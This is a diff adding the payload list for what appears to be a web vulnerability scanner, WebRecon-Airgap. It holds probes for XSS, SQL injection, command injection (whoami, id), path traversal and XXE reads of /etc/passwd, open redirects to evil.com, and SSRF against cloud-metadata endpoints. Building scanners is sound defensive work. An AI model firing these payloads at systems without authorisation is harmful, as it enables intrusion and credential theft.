@@ -1,0 +1,90 @@
+# Fuzzing payloads for WebRecon-Airgap.
+# One payload per line. Lines starting with '#' are ignored.
+# The scanner injects every line into every discovered input
+# (URL params, form fields, fetch bodies).
+#
+# THIS IS THE ONLY SOURCE OF PAYLOADS. There is no hardcoded fallback
+# in the Python source. If this file is missing or empty, the scanner
+# will print a warning and skip active fuzzing.
+#
+# To add your own payloads, just append them below.
+
+# --- Reflected/Stored XSS probes (15) ---------------------------------
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+"><script>alert(1)</script>
+<iframe src="javascript:alert(1)"></iframe>
+<input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+javascript:alert(1)
+<a href="javascript:alert(1)">x</a>
+';alert(1);//
+<scr<script>ipt>alert(1)</script>
+<img src=x:x onerror=alert(1)>
+<marquee onstart=alert(1)>
+<svg><script>alert(1)</script></svg>
+
+# --- SQLi probes (5) --------------------------------------------------
+' OR '1'='1
+' OR '1'='1' --
+admin'--
+1' AND SLEEP(5)--
+' UNION SELECT NULL,NULL,NULL--
+
+# --- Path Traversal probes (4) ----------------------------------------
+../../../../etc/passwd
+../../etc/passwd
+..\..\..\..\windows\win.ini
+..\..\windows\win.ini
+
+# --- Command Injection probes (5) -------------------------------------
+; whoami
+| id
+|| ping -c 3 127.0.0.1
+$({whoami})
+# Echo canary: if the server executes this, the response contains the bare
+# token "wrcanda7ry" (echo output) but NOT the literal "echo wrcanda7ry"
+# command. The scanner flags that as CMDi — reliable cross-platform, catches
+# embedded/Windows output the whoami regexes miss.
+|| echo wrcanda7ry
+
+# --- Open Redirect probes (2) -----------------------------------------
+https://evil.com
+//evil.com
+
+# --- SSTI probes (4) --------------------------------------------------
+{{7*7}}
+${7*7}
+#{7*7}
+<%=7*7%>
+
+# --- SSRF probes (8) --------------------------------------------------
+# Injected like any other payload. Detection is reflection/metadata-based:
+# the scanner flags responses that contain cloud-metadata content
+# (ami-/instance-id/credentials) or internal-fetch error messages leaked
+# back. Blind SSRF (server fetches silently) is NOT detected by these.
+http://127.0.0.1
+http://localhost
+http://[::1]
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+file:///etc/passwd
+dict://localhost:11211/
+
+# --- XXE probes (6) ---------------------------------------------------
+# Each XML payload is a SINGLE LINE (the loader reads one payload per line).
+# When the scanner sees a payload beginning with <?xml or <!DOCTYPE, it
+# POSTs the raw XML to the target endpoint with Content-Type: application/xml
+# (instead of form-encoding it into a field), then matches XXE_PATTERNS.
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]><r>&x;</r>
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://127.0.0.1/x.dtd">%x;]><r/>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+<xml><name>test</name><id>1</id></xml>
+
+# --- Add your own payloads below this line ----------------------------
+
